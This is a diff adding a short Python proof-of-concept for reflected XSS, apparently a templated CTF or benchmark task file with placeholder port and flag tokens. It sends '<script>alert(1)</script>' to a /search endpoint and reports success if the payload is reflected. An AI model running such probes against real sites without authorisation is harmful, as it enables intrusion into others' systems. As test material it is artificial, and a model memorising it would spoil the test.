@@ -1,0 +1,31 @@
+import argparse
+import sys
+import requests
+
+SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
+FLAG_TOKEN = '__FLAG_TOKEN__'
+DEFAULT_PAYLOAD = '<script>alert(1)</script>'
+
+def exploit(base_url: str, payload: str) -> bool:
+    url = base_url.rstrip('/') + '/search'
+    try:
+        resp = requests.get(url, params={'name': payload}, timeout=5)
+    except requests.RequestException as exc:
+        print(f'[xss-compiler] request failed: {exc}', file=sys.stderr)
+        return False
+    return resp.status_code == 200 and payload in (resp.text or '')
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='Reflected XSS compiler PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)
+    args = parser.parse_args()
+    if exploit(args.base_url, args.payload):
+        print(SUCCESS_SIGNATURE)
+        print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[xss-compiler] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+if __name__ == '__main__':
+    main()
